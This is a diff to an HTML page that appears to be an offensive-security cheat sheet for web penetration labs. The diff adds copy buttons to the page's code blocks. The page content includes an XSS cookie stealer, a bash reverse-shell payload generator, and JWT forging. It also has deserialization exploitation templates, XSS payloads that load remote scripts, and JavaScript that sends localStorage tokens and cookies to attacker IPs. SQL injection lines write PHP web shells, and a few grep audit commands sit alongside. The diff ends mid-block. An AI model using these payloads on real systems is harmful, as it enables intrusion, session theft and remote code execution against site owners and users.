@@ -695,15 +695,42 @@
             color: #ffffff;
         }
 
+        .code-container {
+            position: relative;
+            margin-bottom: 10px;
+        }
+
         pre {
             background-color: #0d1117;
             padding: 15px;
             border-radius: 5px;
             overflow-x: auto;
-            margin-bottom: 10px;
+            margin: 0;
         }
 
-        ul li pre {
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #252526;
+            color: #ffffff;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-size: 12px;
+            transition: background-color 0.3s;
+        }
+
+        .copy-btn:hover {
+            background-color: #333333;
+        }
+
+        .copy-btn.copied {
+            background-color: #4CAF50;
+        }
+
+        ul li .code-container {
             margin: 5px 0;
         }
 
@@ -857,15 +884,22 @@
 
         <h3 id="mysql">MySQL</h3>
         <p>Login to the MySQL instance and check out the <code>general_log</code> and values, whether is set to ON or OFF:</p>
-        <pre><code class="language-sql">show variables like '%log%';</code></pre>
+        <div class="code-container">
+            <pre><code class="language-sql">show variables like '%log%';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>If it's set to OFF, run the below command to switch it (as the root user!):</p>
-        <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
+        <div class="code-container">
+            <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Next, check the <code>general_log_file</code> value to see where the actual log file is located using the same.</p>
 
         <h2 id="python-code-snippets">Python Code Snippets</h2>
 
         <h3 id="starting-template">Starting Template</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 import string
 import re
 import threading
@@ -916,9 +950,12 @@ if __name__ == "__main__":
     username, password = register()
     usercookies = login(username, password) 
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="file-upload-with-additional-parameters">File Upload With Additional Parameters</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 import string
 import random
 import io
@@ -971,9 +1008,12 @@ def uploadFile(phpsessid):
 
 uploadFile('example_phpsessid')
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="http-file-server-1">HTTP File Server 1</h3>
-        <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
+        <div class="code-container">
+            <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 
 LHOST      = "10.0.0.1"
@@ -999,9 +1039,12 @@ def start_web_server():
 
 start_web_server()
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="http-file-server-2">HTTP File Server 2</h3>
-        <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
+        <div class="code-container">
+            <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
 
@@ -1048,9 +1091,12 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
 
 start_web_server()
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="http-file-server-3">HTTP File Server 3</h3>
-        <pre><code class="language-python">import threading
+        <div class="code-container">
+            <pre><code class="language-python">import threading
 import mimetypes
 import socket
 import os
@@ -1134,9 +1180,12 @@ server_thread.start()
 # Main program continues here (non-blocking)
 print(f"{success} File server started in background. Main program running...")
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="xss-cookies-stealer">XSS Cookies Stealer</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 import socket
 import base64
 import re
@@ -1196,9 +1245,12 @@ def listen_for_cookies():
 send_xss_payload()
 listen_for_cookies()
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="requests-session-with-proxy">Requests Session with Proxy</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 
 proxies = {
     'http': 'http://127.0.0.1:8080',
@@ -1218,9 +1270,12 @@ data = {'key': 'value'}
 response = session.post('https://example.com/post', data=data)
 print(response.json())
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="generate-reverse-shell-payload">Generate Reverse Shell Payload</h3>
-        <pre><code class="language-python">import base64
+        <div class="code-container">
+            <pre><code class="language-python">import base64
 
 def generate_reverse_shell(lhost, lport):
     shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
@@ -1233,9 +1288,12 @@ if __name__ == "__main__":
     lport = 4444
     generate_reverse_shell(lhost, lport)
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="websocket-client">WebSocket Client</h3>
-        <pre><code class="language-python">import websocket
+        <div class="code-container">
+            <pre><code class="language-python">import websocket
 import json
 
 def on_message(ws, message):
@@ -1260,9 +1318,12 @@ if __name__ == "__main__":
                                 on_close=on_close)
     ws.run_forever()
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="forge-jwt">Forge JWT</h3>
-        <pre><code class="language-python">import jwt
+        <div class="code-container">
+            <pre><code class="language-python">import jwt
 from datetime import datetime, timedelta, timezone
 
 def forge_jwt(key, algorithm='HS256', payload=None):
@@ -1289,9 +1350,12 @@ if __name__ == "__main__":
     token = forge_jwt(key, algorithm, payload)
     print(f"Forged JWT: {token}")
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="get-current-time-epoch">Get Current Time (EPOCH)</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 from datetime import datetime
 import time
 
@@ -1316,43 +1380,88 @@ def get_epoch_from_server():
 
 get_epoch_from_server()
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="insecure-deserialization">Insecure Deserialization</h2>
 
         <h3 id="java">Java</h3>
 
         <h4 id="methods-and-classes">Methods and Classes</h4>
-        <pre><code class="language-java">ObjectInputStream.readObject() - The primary method for deserializing objects in Java. It reads an object from an ObjectInputStream and reconstructs it.</code></pre>
-        <pre><code class="language-java">ObjectInputStream.readUnshared() - Similar to readObject(), but ensures the deserialized object is not shared with previously deserialized objects.</code></pre>
-        <pre><code class="language-java">ObjectInputStream.readResolve() - A special method that can be defined in a class to replace the deserialized object during deserialization.</code></pre>
-        <pre><code class="language-java">ObjectInputStream.defaultReadObject() - Used within a class’s readObject() method to perform default deserialization of non-transient fields.</code></pre>
-        <pre><code class="language-java">XMLDecoder.readObject() - Used to deserialize objects from XML input, typically in JavaBeans-style XML.</code></pre>
-        <pre><code class="language-java">XStream.fromXML() - Part of the XStream library, used to deserialize objects from XML.</code></pre>
-        <pre><code class="language-java">ObjectMapper.readValue() - Part of the Jackson library, used to deserialize JSON or other formats into Java objects.</code></pre>
-        <pre><code class="language-java">Kryo.readObject() - Part of the Kryo serialization library, used for high-performance serialization/deserialization.</code></pre>
-        <pre><code class="language-java">SnakeYAML.load() - Part of the SnakeYAML library, used to deserialize YAML into Java objects.</code></pre>
+        <div class="code-container">
+            <pre><code class="language-java">ObjectInputStream.readObject() - The primary method for deserializing objects in Java. It reads an object from an ObjectInputStream and reconstructs it.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">ObjectInputStream.readUnshared() - Similar to readObject(), but ensures the deserialized object is not shared with previously deserialized objects.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">ObjectInputStream.readResolve() - A special method that can be defined in a class to replace the deserialized object during deserialization.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">ObjectInputStream.defaultReadObject() - Used within a class’s readObject() method to perform default deserialization of non-transient fields.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">XMLDecoder.readObject() - Used to deserialize objects from XML input, typically in JavaBeans-style XML.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">XStream.fromXML() - Part of the XStream library, used to deserialize objects from XML.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">ObjectMapper.readValue() - Part of the Jackson library, used to deserialize JSON or other formats into Java objects.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">Kryo.readObject() - Part of the Kryo serialization library, used for high-performance serialization/deserialization.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-java">SnakeYAML.load() - Part of the SnakeYAML library, used to deserialize YAML into Java objects.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h4 id="identify-insecure-deserialization-in-source-code">Identify Insecure Deserialization in Source Code</h4>
         <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
         <p>Use code analysis tools (e.g., grep, IDE search, or static analysis tools like SonarQube) to find calls to the methods listed above (e.g., readObject, fromXML, readValue).</p>
         <p>Example grep command:</p>
-        <pre><code class="language-bash">grep -r "readObject" .</code></pre>
-        <pre><code class="language-bash">grep -r "XStream\.fromXML ."</code></pre>
-        <pre><code class="language-bash">grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
-        <pre><code class="language-bash">grep -r --include="*.java" -C 10 -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' . | grep -E -B 10 -A 10 '(HttpServletRequest|System\.in|FileInputStream|FileReader|Socket|ServerSocket|getParameter|getInputStream|getReader|request\.|input\.|stream\.|data\.)'</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">grep -r "readObject" .</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">grep -r "XStream\.fromXML ."</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">grep -r --include="*.java" -C 10 -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' . | grep -E -B 10 -A 10 '(HttpServletRequest|System\.in|FileInputStream|FileReader|Socket|ServerSocket|getParameter|getInputStream|getReader|request\.|input\.|stream\.|data\.)'</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>For each deserialization method, trace the input source (e.g., FileInputStream, Socket, HttpServletRequest).</p>
         <p>Check if the input is untrusted (e.g., user-uploaded files, network data, or external API responses).</p>
         <p>Look for validation mechanisms, such as: Use of ObjectInputFilter (Java 9+) to restrict deserialized classes.</p>
         <p>Example:</p>
-        <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+        <div class="code-container">
+            <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
 ObjectInputStream ois = new ObjectInputStream(input);
 ois.setObjectInputFilter(filter);
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Identify classes implementing Serializable or Externalizable.</p>
         <p>Check for readObject(), readResolve(), or writeReplace() methods that could be exploited in gadget chains.</p>
 
         <h4 id="exploitation-template-in-python">Exploitation Template in Python</h4>
-        <pre><code class="language-python">import os
+        <div class="code-container">
+            <pre><code class="language-python">import os
 import re
 import base64
 import urllib.parse
@@ -1400,14 +1509,28 @@ if __name__ == "__main__":
     payload_file = f'Linux_{payload_type}_intruder.txt'
     send_payload(target_url, payload_file, param_name)
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="python-1">Python</h3>
 
         <h4 id="methods-and-classes-1">Methods and Classes</h4>
-        <pre><code class="language-python">pickle.loads() - The primary method for deserializing pickled data in Python.</code></pre>
-        <pre><code class="language-python">pickle.load() - Deserializes from a file-like object.</code></pre>
-        <pre><code class="language-python">yaml.load() with UnsafeLoader - From PyYAML, can deserialize arbitrary objects if unsafe.</code></pre>
-        <pre><code class="language-python">jsonpickle.decode() - From jsonpickle library, deserializes JSON to Python objects.</code></pre>
+        <div class="code-container">
+            <pre><code class="language-python">pickle.loads() - The primary method for deserializing pickled data in Python.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-python">pickle.load() - Deserializes from a file-like object.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-python">yaml.load() with UnsafeLoader - From PyYAML, can deserialize arbitrary objects if unsafe.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-python">jsonpickle.decode() - From jsonpickle library, deserializes JSON to Python objects.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h4 id="identify-insecure-deserialization-in-source-code-1">Identify Insecure Deserialization in Source Code</h4>
         <p>Search for calls to <code>pickle.loads()</code>, <code>pickle.load()</code>, <code>yaml.load(..., Loader=yaml.UnsafeLoader)</code>, or similar.</p>
@@ -1415,7 +1538,8 @@ if __name__ == "__main__":
         <p>Check for lack of validation or safe loaders (e.g., use SafeLoader for YAML).</p>
 
         <h4 id="exploitation-template-in-python-1">Exploitation Template in Python</h4>
-        <pre><code class="language-python">import pickle
+        <div class="code-container">
+            <pre><code class="language-python">import pickle
 import base64
 import os
 import requests
@@ -1444,13 +1568,24 @@ if __name__ == "__main__":
     print(f"Generated Payload: {payload}")
     send_payload(target_url, payload, param_name)
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="php">PHP</h3>
 
         <h4 id="methods-and-classes-2">Methods and Classes</h4>
-        <pre><code class="language-php">unserialize() - The primary function for deserializing serialized data in PHP.</code></pre>
-        <pre><code class="language-php">__wakeup() - Magic method called before deserialization.</code></pre>
-        <pre><code class="language-php">__destruct() - Magic method called when object is destroyed, often used in gadget chains.</code></pre>
+        <div class="code-container">
+            <pre><code class="language-php">unserialize() - The primary function for deserializing serialized data in PHP.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-php">__wakeup() - Magic method called before deserialization.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-php">__destruct() - Magic method called when object is destroyed, often used in gadget chains.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Libraries like Symfony, Laravel may have vulnerable gadgets.</p>
 
         <h4 id="identify-insecure-deserialization-in-source-code-2">Identify Insecure Deserialization in Source Code</h4>
@@ -1459,7 +1594,8 @@ if __name__ == "__main__":
         <p>Check for lack of 'allowed_classes' option in unserialize.</p>
 
         <h4 id="exploitation-template-in-python-2">Exploitation Template in Python</h4>
-        <pre><code class="language-python">import os
+        <div class="code-container">
+            <pre><code class="language-python">import os
 import base64
 import requests
 import urllib.parse
@@ -1491,11 +1627,16 @@ if __name__ == "__main__":
     print(f"Generated Payload: {payload}")
     send_payload(target_url, payload, param_name)
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="nodejs">Node.js</h3>
 
         <h4 id="methods-and-classes-3">Methods and Classes</h4>
-        <pre><code class="language-javascript">serialize.unserialize() from node-serialize - Vulnerable to RCE if using eval.</code></pre>
+        <div class="code-container">
+            <pre><code class="language-javascript">serialize.unserialize() from node-serialize - Vulnerable to RCE if using eval.</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Custom deserializers in libraries like funcster.</p>
         <p>Magic markers like _$$ND_FUNC$$_ for functions.</p>
 
@@ -1505,7 +1646,8 @@ if __name__ == "__main__":
         <p>Check for untrusted input to unserialize functions.</p>
 
         <h4 id="exploitation-template-in-python-3">Exploitation Template in Python</h4>
-        <pre><code class="language-python">import base64
+        <div class="code-container">
+            <pre><code class="language-python">import base64
 import requests
 import urllib.parse
 
@@ -1534,11 +1676,14 @@ if __name__ == "__main__":
     print(f"Generated Payload: {payload}")
     send_payload(target_url, payload, param_name)
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="regex-cheatsheet">Regex Cheatsheet</h2>
 
         <h3 id="match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 import re
 
 target = 'http://example.com'
@@ -1550,9 +1695,12 @@ r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
 print(match[1].strip())
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="extract-a-cookie-value-from-response-headers">Extract a Cookie Value from Response Headers</h3>
-        <pre><code class="language-python">import requests
+        <div class="code-container">
+            <pre><code class="language-python">import requests
 import re
 
 target = 'http://example.com'
@@ -1565,29 +1713,62 @@ set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
 print(match.group(1))
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="xss-payloads">XSS Payloads</h2>
 
         <h3 id="load-external-javascript">Load External JavaScript</h3>
-        <pre><code class="language-html">&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></pre>
-        <pre><code class="language-html">&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></pre>
-        <pre><code class="language-html">&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
-        <pre><code class="language-html">&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></pre>
-        <pre><code class="language-html">&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></pre>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="load-inline-javascript">Load Inline JavaScript</h3>
-        <pre><code class="language-html">&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
-        <pre><code class="language-html">&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></pre>
-        <pre><code class="language-html">&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
-        <pre><code class="language-html">&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></pre>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-html">&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="send-localstorage-token-value-from-user-key-to-remote-resource">Send localStorage Token Value from User Key to Remote Resource</h3>
-        <pre><code class="language-javascript">fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});
+        <div class="code-container">
+            <pre><code class="language-javascript">fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="leverage-xss-to-csrf">Leverage XSS to CSRF</h3>
         <p>Grab csrftoken and send HTTP request including csrftoken in the request:</p>
-        <pre><code class="language-javascript">var req = new XMLHttpRequest();
+        <div class="code-container">
+            <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/my-account',true);
 req.send();
@@ -1598,9 +1779,12 @@ function handleResponse() {
     changeReq.send('csrf='+token+'&email=test@test.com')
 };
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="filter-specific-cookie-value-and-send-it-back">Filter Specific Cookie Value and Send It Back</h3>
-        <pre><code class="language-javascript">function getCookieValue(name) {
+        <div class="code-container">
+            <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -1618,9 +1802,12 @@ var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
 req2.send();
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="send-request-to-specific-endpoint-with-custom-header-and-send-response-back">Send Request to Specific Endpoint with Custom Header and Send Response Back</h3>
-        <pre><code class="language-javascript">function getCookieValue(name) {
+        <div class="code-container">
+            <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -1646,56 +1833,173 @@ var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + btoa(response), true);
 req2.send();
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="sql-injection-payloads-and-postgres-cheatsheet">SQL Injection Payloads and Postgres Cheatsheet</h2>
 
         <h3 id="sql-injection-payloads">SQL Injection Payloads</h3>
-        <pre><code class="language-sql">' UNION SELECT 1,2,3 -- -</code></pre>
-        <pre><code class="language-sql">' OR 1=1 GROUP BY column_name HAVING 1=1 -- -</code></pre>
-        <pre><code class="language-sql">' AND 1=1 -- -</code></pre>
-        <pre><code class="language-sql">' AND 1=2 -- -</code></pre>
-        <pre><code class="language-sql">' AND (SELECT pg_sleep(5)) -- -</code></pre>
-        <pre><code class="language-sql">' AND SLEEP(5) -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT version() -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT @@version -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT datname FROM pg_database -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT schema_name FROM information_schema.schemata -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT username,password FROM users -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php' -- -</code></pre>
-        <pre><code class="language-sql">' UNION SELECT lo_export(lo_create('\x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e'), '/var/www/html/shell.php') -- -</code></pre>
-        <pre><code class="language-sql">INSERT INTO users (id, name) VALUES (1, 'test') INTO OUTFILE '/tmp/test.txt' -- -</code></pre>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT 1,2,3 -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' OR 1=1 GROUP BY column_name HAVING 1=1 -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' AND 1=1 -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' AND 1=2 -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' AND (SELECT pg_sleep(5)) -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' AND SLEEP(5) -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT version() -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT @@version -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT datname FROM pg_database -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT schema_name FROM information_schema.schemata -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT username,password FROM users -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT lo_export(lo_create('\x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e'), '/var/www/html/shell.php') -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
